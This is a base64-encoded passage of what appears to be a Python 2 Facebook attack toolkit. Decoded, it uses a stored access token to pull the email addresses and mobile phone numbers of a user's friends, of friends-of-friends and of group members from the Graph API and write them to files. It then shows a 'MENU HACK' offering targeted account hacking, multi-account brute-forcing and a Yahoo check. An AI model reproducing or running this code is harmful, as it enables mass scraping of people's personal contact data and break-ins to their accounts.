JpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L25vX21lbWJlcl9ncm91cC50eHQnLCd3JykNCgkJcmU9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCXM9anNvbi5sb2FkcyhyZS50ZXh0KQ0KCQlmb3IgYSBpbiBzWydkYXRhJ106DQoJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2FbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCXRyeToNCgkJCQludW1iZXIuYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQ0KCQkJCW1ha2VfYWN0aW9uLndyaXRlKHpbJ21vYmlsZV9waG9uZSddICsgJ1xuJykNCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihudW1iZXIpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQ0KCQkJZXhjZXB0IEtleUVycm9yOg0KCQkJCXBhc3MNCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgcGhvbmUgbnVtYmVyIGZyb20gbWVtYmVyIGdyb3VwIFwwMzNbMTs5N20uLi4uJw0KCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4obnVtYmVyKSkNCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQ0KCQlvcy5yZW5hbWUoJ291dC9ub19tZW1iZXJfZ3JvdXAudHh0Jywnb3V0LycrZG9uZSkNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6DQoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiINCgkJZXhpdCgpDQoNCiMjIyMjIEVNQUlMICMjIyMjDQpkZWYgZW1haWwoKToNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3MubWtkaXIoJ291dCcpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCXBhc3MNCgl0cnk6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgZW1haWwgXDAzM1sxOzk3bS4uLicpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQltYWtlX2FjdGlvbiA9IG9wZW4oJ291dC9lbWFpbF9mcmllbmRzLnR4dCcsJ3cnKQ0KCQlmb3IgaSBpbiBhWydkYXRhJ106DQoJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCXRyeToNCgkJCQllbS5hcHBlbmQoelsnZW1haWwnXSkNCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6WydlbWFpbCddICsgJ1xuJykNCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkNCgkJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCQlwYXNzDQoJCW1ha2VfYWN0aW9uLmNsb3NlKCkNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGVtYWlsIFwwMzNbMTs5N20uLi4uJw0KCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbSkpDQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikNCgkJb3MucmVuYW1lKCdvdXQvZW1haWxfZnJpZW5kcy50eHQnLCdvdXQvJytkb25lKQ0KCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIg0KCQlleGl0KCkNCg0KIyMjIyMgRU1BSUwgRlJPTSBGUklFTkRTICMjIyMjDQpkZWYgZW1haWxfZnJvbV9mcmllbmRzKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikNCgkJdHJ5Og0KCQkJc2VhdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCW9wID0ganNvbi5sb2FkcyhzZWF0LnRleHQpDQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCINCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQlkdW1wKCkNCgkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlhID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGVtYWlsIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJbWFrZV9hY3Rpb24gPSBvcGVuKCdvdXQvZW1fZnJpZW5kc19mcm9tX2ZyaWVuZHMudHh0JywndycpDQoJCWZvciBpIGluIGFbJ2RhdGEnXToNCgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJdHJ5Og0KCQkJCWVtYWlsX2Zyb21fZnJpZW5kcy5hcHBlbmQoelsnZW1haWwnXSkNCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6WydlbWFpbCddICsgJ1xuJykNCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbWFpbF9mcm9tX2ZyaWVuZHMpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ2VtYWlsJ10rIiB8ICIrelsnbmFtZSddKyJcbiIpLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpDQoJCQlleGNlcHQgS2V5RXJyb3I6DQoJCQkJcGFzcw0KCQltYWtlX2FjdGlvbi5jbG9zZSgpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBcMDMzWzE7OTdtLi4uLicNCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBFbWFpbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oZW1haWxfZnJvbV9mcmllbmRzKSkNCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQ0KCQlvcy5yZW5hbWUoJ291dC9lbV9mcmllbmRzX2Zyb21fZnJpZW5kcy50eHQnLCdvdXQvJytkb25lKQ0KCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIg0KCQlleGl0KCkNCg0KIyMjIyMgUEhPTkUgTlVNQkVSICMjIyMjDQpkZWYgcGhvbmVfbnVtYmVyKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgcGhvbmUgXDAzM1sxOzk3bS4uLicpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQl1cmw9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuDQoJCXIgPXJlcXVlc3RzLmdldCh1cmwpDQoJCXo9anNvbi5sb2FkcyhyLnRleHQpDQoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L25vbWVyX2ZyaWVuZHMudHh0JywndycpDQoJCWZvciBuIGluIHpbImRhdGEiXToNCgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrblsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJdHJ5Og0KCQkJCWhwLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkNCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6Wydtb2JpbGVfcGhvbmUnXSArICdcbicpDQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHApKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQ0KCQkJZXhjZXB0IEtleUVycm9yOg0KCQkJCXBhc3MNCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgbnVtYmVyIFwwMzNbMTs5N20uLi4uJw0KCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHApKQ0KCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpDQoJCW9zLnJlbmFtZSgnb3V0L25vbWVyX2ZyaWVuZHMudHh0Jywnb3V0LycrZG9uZSkNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6DQoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiINCgkJZXhpdCgpDQoNCiMjIyMjIFBIT05FIE5VTUJFUiBGUk9NIEZSSUVORFMgIyMjIyMNCmRlZiBwaG9uZV9udW1iZXJfZnJvbV9mcmllbmRzKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikNCgkJdHJ5Og0KCQkJc2VhdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCW9wID0ganNvbi5sb2FkcyhzZWF0LnRleHQpDQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCINCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQlkdW1wKCkNCgkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlhID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIG51bWJlciBmcm9tIGZyaWVuZCBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L25vX2ZyaWVuZHNfZnJvbV9mcmllbmRzLnR4dCcsJ3cnKQ0KCQlmb3IgaSBpbiBhWydkYXRhJ106DQoJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCXRyeToNCgkJCQlocGZyb21mcmllbmRzLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkNCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6Wydtb2JpbGVfcGhvbmUnXSArICdcbicpDQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHBmcm9tZnJpZW5kcykpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnbW9iaWxlX3Bob25lJ10rIiB8ICIrelsnbmFtZSddKyJcbiIpLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpDQoJCQlleGNlcHQgS2V5RXJyb3I6DQoJCQkJcGFzcw0KCQltYWtlX2FjdGlvbi5jbG9zZSgpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBudW1iZXIgXDAzM1sxOzk3bS4uLi4nDQoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgTnVtYmVyIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihocGZyb21mcmllbmRzKSkNCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQ0KCQlvcy5yZW5hbWUoJ291dC9ub19mcmllbmRzX2Zyb21fZnJpZW5kcy50eHQnLCdvdXQvJytkb25lKQ0KCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIg0KCQlleGl0KCkNCg0KIyMjIyMgTUVOVSBIQUNLICMjIyMjDQpkZWYgbWVudV9oYWNrKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gU2ltcGxlIEZhY2Vib29rIEhhY2soXDAzM1sxOzkybVRhcmdldFwwMzNbMTs5N20pIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIEZhY2Vib29rIE11bHRpIEJydXRlZm9yY2UiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gU3Ryb25nIEZhY2Vib29rIE11bHRpIEJydXRlZm9yY2UgIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEZhY2Vib29rIEJydXRlRm9yY2UoXDAzM1sxOzkybVRhcmdldFwwMzNbMTs5N20pIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS5cMDMzWzE7OTdtIFlhaG9vIENoZWNrIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siDQoJcHJpbnQgIuKVkSINCgljaG9vc2VfaGFjay